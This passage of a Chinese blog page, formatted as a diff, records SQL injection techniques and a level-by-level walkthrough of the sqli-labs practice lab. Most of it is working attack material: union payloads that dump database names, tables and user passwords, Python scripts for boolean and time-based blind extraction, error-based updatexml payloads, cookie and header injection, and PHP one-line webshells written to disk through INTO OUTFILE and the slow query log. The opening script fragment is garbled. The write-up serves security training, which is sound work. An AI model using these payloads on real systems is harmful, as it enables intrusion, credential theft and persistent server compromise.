+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆表名</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;users&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆字段</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆用户名</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(password) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #爆密码</span>
+<span class="hljs-string">        try:</span>
+<span class="hljs-string">            r = requests.get[ | POST ](url + payload, timeout=2)</span>
+<span class="hljs-string">            head = mid + 1</span>
+<span class="hljs-string">        except Exception as e:</span>
+<span class="hljs-string">            tail = mid</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    if head != 32:</span>
+<span class="hljs-string">        result += chr(head)</span>
+<span class="hljs-string">    else:</span>
+<span class="hljs-string">        break</span>
+<span class="hljs-string">print(result)</span></code></pre>
+
+
+
+<h4 id="3-mysql注入读写文件"><a href="#3-mysql注入读写文件" class="headerlink" title="3.mysql注入读写文件"></a>3.mysql注入读写文件</h4><p>mysql数据库在渗透过程中能够使用的功能除了读取数据之外，还可以对文件进行读写。</p>
+<h5 id="1-前提"><a href="#1-前提" class="headerlink" title="1.前提"></a>1.前提</h5><p>1.用户权限足够高，尽量具有root权限</p>
+<p>2.secure_file_priv不为null(默认为null)</p>
+<pre><code class="hljs mysql">查看secure_file_priv的值
+show global variables like &#39;%secure%&#39;;
+或者是直接搜全名
+show global variables like &#39;secure_file_priv&#39;;
+
+修改值:
+windows下：修改my.ini 在[mysqld]内加入secure_file_priv &#x3D;  #设置为空不对mysqld 的导入 | 导出做限制
+linux下：修改&#x2F;etc&#x2F;my.cnf 在[mysqld]内加入secure_file_priv &#x3D;
+若要将mysql的写入写出限制在某一目录下，只需secure_file_priv的值为该目录即可，例如：secure_file_priv&#x3D;&#x2F;tmp&#x2F;
+然后重启mysql，再查询secure_file_priv</code></pre>
+
+
+
+<h5 id="2-读取文件"><a href="#2-读取文件" class="headerlink" title="2.读取文件"></a>2.读取文件</h5><p>读取文件load_file()</p>
+<pre><code class="hljs mysql">url?id&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ] union select 1,load_file(&quot;path&quot;),[3,4...] --+
+注意路径需要双斜杠：\\</code></pre>
+
+
+
+<h5 id="3利用into-outfile写入文件"><a href="#3利用into-outfile写入文件" class="headerlink" title="3利用into outfile写入文件"></a>3利用into outfile写入文件</h5><pre><code class="hljs mysql">url?id&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ] union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;[3,4...] into outfile&#39;&#x2F;path&#x2F;文件名&#39; --+
+注意路径需要双斜杠：\\
+并且写马子的时候不能用&#39;&#39;，尽量使用数字作为密码，因为单引号会闭合前面的引号</code></pre>
+
+
+
+<h5 id="4-利用日志写shell"><a href="#4-利用日志写shell" class="headerlink" title="4.利用日志写shell"></a>4.利用日志写shell</h5><p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志，日志的详细情况参考<a target="_blank" rel="noopener" href="http://blog.51cto.com/pangge/1319304">mysql日志详细解析</a>，本次利用查询日志</p>
+<p>1.设置slow_query_log=1.即启用慢查询日志(默认禁用)。</p>
+<pre><code class="hljs mysql">set global slow_query_log&#x3D;1;</code></pre>
+
+<p>2.伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名</p>
+<pre><code class="hljs mysql">set global slow_query_log_file&#x3D;&#39;dir\filename&#39;;
+#注意路径双写</code></pre>
+
+<p>3.向日志文件写入shell</p>
+<pre><code class="hljs mysql">select &#39;&lt;?php phpinfo();?&gt;&#39; or sleep(11);</code></pre>
+
+<p>4.利用:浏览器直接访问该网站下的伪造的该日志文件路径</p>
+<pre><code class="hljs coffeescript">ip<span class="hljs-regexp">/[dir/</span>]filename</code></pre>
+
+<p>或者是把写入的内容改为一句话木马也可。</p>
+<h2 id="2-靶场通关记录"><a href="#2-靶场通关记录" class="headerlink" title="2.靶场通关记录"></a>2.靶场通关记录</h2><h3 id="Less1：GET基于报错的字符型注入-单引号"><a href="#Less1：GET基于报错的字符型注入-单引号" class="headerlink" title="Less1：GET基于报错的字符型注入(单引号)"></a>Less1：GET基于报错的字符型注入(单引号)</h3><p>1.找到注入点：id</p>
+<img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216160721715.png" srcset="/img/loading.gif" alt="image-20210216160721715" style="zoom:80%;">
+
+<p>2.进行试错，猜测语句</p>
+<img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216161133243.png" srcset="/img/loading.gif" alt="image-20210216161133243" style="zoom:80%;">
+
+<p>则语句为：<code>select login_name,passwd from table where id = &#39;number&#39; limit 0,1</code></p>
+<p>3.判断字段数：3</p>
+<p>payload：<code>?id=1&#39;order by 4 --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164833065.png" srcset="/img/loading.gif" alt="image-20210216164833065" style="zoom:80%;"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216164901146.png" srcset="/img/loading.gif" alt="image-20210216164901146" style="zoom:80%;"></p>
+<p>4.爆数据库</p>
+<p>MySQL中的所有数据库：</p>
+<p>payload：<code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216171624988.png" srcset="/img/loading.gif" alt="image-20210216171624988"></p>
+<p>当前正在使用的数据库以及系统的所有信息</p>
+<p>payload：<code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p>
+<p>ps:<code>concat_ws</code>可替换为<code>group_concat</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216193609512.png" srcset="/img/loading.gif" alt="image-20210216193609512"></p>
+<p>5.爆表名     </p>
+<p>payload：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</code></p>
+<p>或者没有爆出当前表名：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195024012.png" srcset="/img/loading.gif" alt="image-20210216195024012"></p>
+<p>6.爆列名</p>
+<p>payload：<code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195634870.png" srcset="/img/loading.gif" alt="image-20210216195634870"></p>
+<p>7.爆出所有账户密码</p>
+<p>payload：<code>?id=-1&#39; union select 1,group_concat(username,password),3 from users --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216195854574.png" srcset="/img/loading.gif" alt="image-20210216195854574"></p>
+<h3 id="Less2：GET基于报错数字型注入"><a href="#Less2：GET基于报错数字型注入" class="headerlink" title="Less2：GET基于报错数字型注入"></a>Less2：GET基于报错数字型注入</h3><p>1.找到注入点：id</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216201108241.png" srcset="/img/loading.gif" alt="image-20210216201108241"></p>
+<p>2.试错，猜语句</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216202344713.png" srcset="/img/loading.gif" alt="image-20210216202344713"></p>
+<p>则语句：<code>select login_name,passwd from table where id = number limit 0,1</code></p>
+<p>找到闭合了就和less1一样了剩下的</p>
+<h3 id="Less3：GET基于报错字符型注入-带括号的单引号"><a href="#Less3：GET基于报错字符型注入-带括号的单引号" class="headerlink" title="Less3：GET基于报错字符型注入(带括号的单引号)"></a>Less3：GET基于报错字符型注入(带括号的单引号)</h3><p>1.寻找注入点：id</p>
+<p>2.试错，猜语句</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217001833673.png" srcset="/img/loading.gif" alt="image-20210217001833673"></p>
+<p>则语句为：<code>select login_name,passwd from table where id=(&#39;1&#39;) limit 0,1</code></p>
+<p>闭合找到后和less1剩下的操作一样了</p>
+<h3 id="Less4：GET基于报错字符型注入-双引号"><a href="#Less4：GET基于报错字符型注入-双引号" class="headerlink" title="Less4：GET基于报错字符型注入(双引号)"></a>Less4：GET基于报错字符型注入(双引号)</h3><p>1.寻找注入点：id</p>
+<p>2.试错，猜语句</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217003701458.png" srcset="/img/loading.gif" alt="image-20210217003701458"></p>
+<p>则语句为：<code>select login_name,passwd from table where id=(”1“) limit 0,1</code></p>
+<p>剩下的操作参考less1</p>
+<h3 id="Less5：GET双查询字符型-单引号"><a href="#Less5：GET双查询字符型-单引号" class="headerlink" title="Less5：GET双查询字符型(单引号)"></a>Less5：GET双查询字符型(单引号)</h3><p>这一关如果正确则显示you are in …,失败则会报错。这一关可以当作盲注解决，但是如题目一样使用双查询</p>
+<p>payload</p>
+<pre><code class="hljs mysql">#当前使用数据库
+?id&#x3D;-1&#39; union select 1,count(*), concat_ws(&#39;:&#39;,(select database()), floor(rand()*2))as a from information_schema.tables group by a --+</code></pre>
+
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219001046483.png" srcset="/img/loading.gif" alt="image-20210219001046483"></p>
+<p>也可布尔盲注，参考less5</p>
+<h3 id="Less6：GET双查询字符型-双引号"><a href="#Less6：GET双查询字符型-双引号" class="headerlink" title="Less6：GET双查询字符型(双引号)"></a>Less6：GET双查询字符型(双引号)</h3><p>和less5一样，只不过闭合是双引号。</p>
+<h3 id="Less7：盲注GET文件写入"><a href="#Less7：盲注GET文件写入" class="headerlink" title="Less7：盲注GET文件写入"></a>Less7：盲注GET文件写入</h3><p>1.注入点：id</p>
+<p>2.猜语句，经过多次实验，只有输入<code>&#39;</code>会报错</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217174821016.png" srcset="/img/loading.gif" alt="image-20210217174821016"></p>
+<p>没有错误提示，盲注，经过多次实验，以下可行</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217175333779.png" srcset="/img/loading.gif" alt="image-20210217175333779"></p>
+<p>则猜测语句注入点为：<code>?id=((&#39;1&#39;))</code></p>
+<p>3.猜字段</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180130902.png" srcset="/img/loading.gif" alt="image-20210217180130902"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217180147338.png" srcset="/img/loading.gif" alt="image-20210217180147338"></p>
+<p>4.写shell</p>
+<p>payload：<code>?id=-1&#39;)) union select 1,&#39;&lt;?php @eval($POST_[1])?&gt;&#39;3 into outfile&#39;C:\\test\\1.php&#39; --+</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217183945287.png" srcset="/img/loading.gif" alt="image-20210217183945287"></p>
+<h3 id="Less8：GET布尔盲注"><a href="#Less8：GET布尔盲注" class="headerlink" title="Less8：GET布尔盲注"></a>Less8：GET布尔盲注</h3><p>1.注入点：id</p>
+<p>2.猜关键点语句</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184401867.png" srcset="/img/loading.gif" alt="image-20210217184401867"></p>
+<p>没有错误提示，是盲注，只有一次次自己实验闭合</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217184336953.png" srcset="/img/loading.gif" alt="image-20210217184336953"></p>
+<p>则关键点闭合为：<code>?id=&#39;1&#39;</code></p>
+<p>3.猜字段：3</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193145935.png" srcset="/img/loading.gif" alt="image-20210217193145935"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217193201961.png" srcset="/img/loading.gif" alt="image-20210217193201961"></p>
+<p>4.跑数据，用二分法，用burp跑步骤太多了。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span>
+result = <span class="hljs-string">&quot;&quot;</span>
+i=<span class="hljs-number">0</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+	i=i+<span class="hljs-number">1</span>
+	min_value = <span class="hljs-number">32</span>
+	max_value = <span class="hljs-number">127</span>
+	mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#中值</span>
+	<span class="hljs-keyword">while</span>(min_value&lt;max_value):
+		payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)--+&#x27;</span> <span class="hljs-comment">#爆当前数据库名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27;  #爆表名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆字段</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆用户名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&#x27; #爆密码</span>
+		html = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)
+		
+		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> html.text:
+            			<span class="hljs-comment">#ascii值比mid值大</span>
+			min_value = mid+<span class="hljs-number">1</span>   
+		<span class="hljs-keyword">else</span>:
+			max_value = mid
+		mid = (min_value+max_value)//<span class="hljs-number">2</span>
+    
+	
+	<span class="hljs-keyword">if</span> min_value != <span class="hljs-number">32</span>:
+		result += chr(min_value)
+	<span class="hljs-keyword">else</span>:
+		<span class="hljs-keyword">break</span>
+
+print(result)</code></pre>
+
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210217202626517.png" srcset="/img/loading.gif" alt="image-20210217202626517"></p>
+<h3 id="Less9：GET时间盲注-单引号"><a href="#Less9：GET时间盲注-单引号" class="headerlink" title="Less9：GET时间盲注(单引号)"></a>Less9：GET时间盲注(单引号)</h3><p>1.注入点：id</p>
+<p>2.试错，猜语句.猜鸭儿，试了很多语句都是一样的回显，看了眼后台果断懵逼，不会有第二种结果。。。</p>
+<p>老规矩二分法</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.43.78/sqli-labs/Less-8/?id=1&#x27; and 1=&quot;</span>
+
+result = <span class="hljs-string">&#x27;&#x27;</span>
+i = <span class="hljs-number">0</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    i = i + <span class="hljs-number">1</span>
+    head = <span class="hljs-number">32</span>
+    tail = <span class="hljs-number">127</span>
+
+    <span class="hljs-keyword">while</span> head &lt; tail:
+        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span> <span class="hljs-comment">#中值</span>
+        payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span> <span class="hljs-comment">#当前数据库名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆表名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆字段</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆用户名</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27; #爆密码</span>
+        <span class="hljs-keyword">try</span>:
+            r = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)
+            head = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            tail = mid
+
+    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:
+        result += chr(head)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">break</span>
+print(result)</code></pre>
+
+
+
+<h3 id="Less10：GET时间盲注-双引号"><a href="#Less10：GET时间盲注-双引号" class="headerlink" title="Less10：GET时间盲注(双引号)"></a>Less10：GET时间盲注(双引号)</h3><p>试了很多遍，结果都一样，看了眼后台果然不会有第二种结果。。直接上脚本</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;url/?id=1\&quot; and 1=&quot;</span>   <span class="hljs-comment">#\转义</span>
+
+result = <span class="hljs-string">&#x27;&#x27;</span>
+i = <span class="hljs-number">0</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    i = i + <span class="hljs-number">1</span>
+    head = <span class="hljs-number">32</span>
+    tail = <span class="hljs-number">127</span>
+
+    <span class="hljs-keyword">while</span> head &lt; tail:
+        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>
+        payload = <span class="hljs-string">f&#x27;if(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,sleep(3))--+&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))--+&#x27;</span>
+        <span class="hljs-keyword">try</span>:
+            r = requests.get(url + payload, timeout=<span class="hljs-number">2</span>)
+            head = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            tail = mid
+
+    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:
+        result += chr(head)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">break</span>
+print(result)</code></pre>
+
+
+
+<h3 id="Less11：POST报错注入字符型-单引号"><a href="#Less11：POST报错注入字符型-单引号" class="headerlink" title="Less11：POST报错注入字符型(单引号)"></a>Less11：POST报错注入字符型(单引号)</h3><p>发现登录界面，随便试错猜语句</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218002409207.png" srcset="/img/loading.gif" alt="image-20210218002409207"></p>
+<p>则语句：<code>uname=&#39;1&#39; and password=&#39;&#39; LIMIT 0,1</code></p>
+<p>直接在登陆界面执行以下payload可以查询到数据库，表，账户密码信息</p>
+<pre><code class="hljs mysql">MySQL中的所有数据库：	
+-1&#39; union select 1,group_concat(schema_name)from information_schema.schemata #
+
+当前正在使用的数据库以及系统的所有信息
+-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os,user())  #
+
+爆出当前表名
+-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #
+
+爆列名
+-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #
+
+爆出所有账户密码
+-1&#39; union select 1,group_concat(username,password) from users #</code></pre>
+
+
+
+<p>或者是直接进后台得到一个账号密码：<code>1&#39; or 1=1 #</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210218005003622.png" srcset="/img/loading.gif" alt="image-20210218005003622"></p>
+<h3 id="Less12：POST报错注入字符型-带单括号的单引号"><a href="#Less12：POST报错注入字符型-带单括号的单引号" class="headerlink" title="Less12：POST报错注入字符型(带单括号的单引号)"></a>Less12：POST报错注入字符型(带单括号的单引号)</h3><p>按less11的步骤来，只不过是以<code>&quot;)</code>闭合的</p>
+<h3 id="Less13：POST字符型双查询-带括号的单引号"><a href="#Less13：POST字符型双查询-带括号的单引号" class="headerlink" title="Less13：POST字符型双查询(带括号的单引号)"></a>Less13：POST字符型双查询(带括号的单引号)</h3><p>利用方法参考less5。另外：</p>
+<p>updatexml测试有回显：<code>111&#39;) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p>
+<p>extractvalue也有回显：<code>111&#39;) and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></p>
+<h3 id="Less14：POST字符型双查询-带括号的单引号"><a href="#Less14：POST字符型双查询-带括号的单引号" class="headerlink" title="Less14：POST字符型双查询(带括号的单引号)"></a>Less14：POST字符型双查询(带括号的单引号)</h3><p>双查询没搞出来，但是用updatexml和extractvalue有回显</p>
+<p>盲注：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;url&quot;</span>
+
+result = <span class="hljs-string">&#x27;&#x27;</span>
+i = <span class="hljs-number">0</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    i = i + <span class="hljs-number">1</span>
+    head = <span class="hljs-number">32</span>
+    tail = <span class="hljs-number">127</span>
+
+    <span class="hljs-keyword">while</span> head &lt; tail:
+        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>
+        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&#x27;</span>
+        payload = <span class="hljs-string">f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(username) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>
+        <span class="hljs-comment"># payload = f&#x27;hhh&quot; or 1=if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) #&#x27;</span>
+        data = &#123;
+            <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;hhh&#x27;</span>,
+            <span class="hljs-string">&#x27;passwd&#x27;</span>: payload
+        &#125;
+        r = requests.post(url, data=data)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:
+            head = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            tail = mid
+
+    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:
+        result += chr(head)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">break</span>
+print(result)</code></pre>
+
+
+
+<h3 id="Less15：POST布尔-时间盲注-带单引号"><a href="#Less15：POST布尔-时间盲注-带单引号" class="headerlink" title="Less15：POST布尔/时间盲注(带单引号)"></a>Less15：POST布尔/时间盲注(带单引号)</h3><p>lesss14中的盲注双引号改为单引号即可</p>
+<p>也可手动burp操作</p>
+<p>例如猜数据库长度</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219011737775.png" srcset="/img/loading.gif" alt="image-20210219011737775"></p>
+<p>成功后响应时间变长</p>
+<p>1’ and updatexml(1,concat(0x7e,(select @@version()),0x7e),1)#</p>
+<h3 id="Less16：POST布尔-时间盲注-带双引号"><a href="#Less16：POST布尔-时间盲注-带双引号" class="headerlink" title="Less16：POST布尔/时间盲注(带双引号)"></a>Less16：POST布尔/时间盲注(带双引号)</h3><p>lesss14中的盲注脚本即可</p>
+<h3 id="Less17：update"><a href="#Less17：update" class="headerlink" title="Less17：update"></a>Less17：update</h3><p>这一关难搞，试了半天的username，打开后台一瞅，好家伙全是转义。。。</p>
+<p>如其名，猜测就是更新数据的，所以试一试updatexml，成了。</p>
+<p>payload：<code>1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219122421671.png" srcset="/img/loading.gif" alt="image-20210219122421671"></p>
+<p>需要注意的是，既然是更新信息，那么所选择的username在数据库中要存在</p>
+<h3 id="Less18：http-useragent注入"><a href="#Less18：http-useragent注入" class="headerlink" title="Less18：http-useragent注入"></a>Less18：http-useragent注入</h3><p>这一关要先知道账号密码，可以使用brup进行爆破得到，然后进行UA注入</p>
+<p>payload：<code> &#39;and  updatexml(1,concat(0x7e,@@version,0x7e),1) or &#39;1&#39;=&#39;1</code></p>
+<p>这里不直接注释掉是因为后台是先进行插入，再显示出来的。</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164225757.png" srcset="/img/loading.gif" alt="image-20210219164225757"></p>
+<h3 id="Less19：http-refer注入"><a href="#Less19：http-refer注入" class="headerlink" title="Less19：http-refer注入"></a>Less19：http-refer注入</h3><p>和less18一样，在refer进行注入</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219164503461.png" srcset="/img/loading.gif" alt="image-20210219164503461"></p>
+<h3 id="Less20：cooike注入"><a href="#Less20：cooike注入" class="headerlink" title="Less20：cooike注入"></a>Less20：cooike注入</h3><p>找个账号登进去</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219173109251.png" srcset="/img/loading.gif" alt="image-20210219173109251"></p>
+<p>抓包修改cooike：<code>uname=admin&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p>
+<h3 id="less21：cookie-base64（带括号的单引号）"><a href="#less21：cookie-base64（带括号的单引号）" class="headerlink" title="less21：cookie-base64（带括号的单引号）"></a>less21：cookie-base64（带括号的单引号）</h3><p>瞅瞅，base64加密了，简单嘛，把上一关的payloadbase64一下就o了</p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219181040717.png" srcset="/img/loading.gif" alt="image-20210219181040717"></p>
+<p>先试试闭合</p>
+<p>尝试各种闭合之后发现<code>1&#39;) #</code>不会报错</p>
+<p>payload：<code>uname=YWRtaW4xJylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKFNFTEVDVCBkYXRhYmFzZSgpKSwweDdlKSwxKSM=</code></p>
+<p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210219185850820.png" srcset="/img/loading.gif" alt="image-20210219185850820"></p>
+<p>建议加解密到此网站：<a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3%EF%BC%8C%E8%B8%A9%E4%BA%86%E5%BE%88%E5%A4%9A%E5%9D%91%E3%80%82%E3%80%82%E3%80%82">https://tool.oschina.net/encrypt?type=3，踩了很多坑。。。</a></p>
+<h3 id="less22：cookie-base64（双引号）"><a href="#less22：cookie-base64（双引号）" class="headerlink" title="less22：cookie-base64（双引号）"></a>less22：cookie-base64（双引号）</h3><p>经过实验和less21只是闭合不一样，换成双引号就好了</p>
+<p>​</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
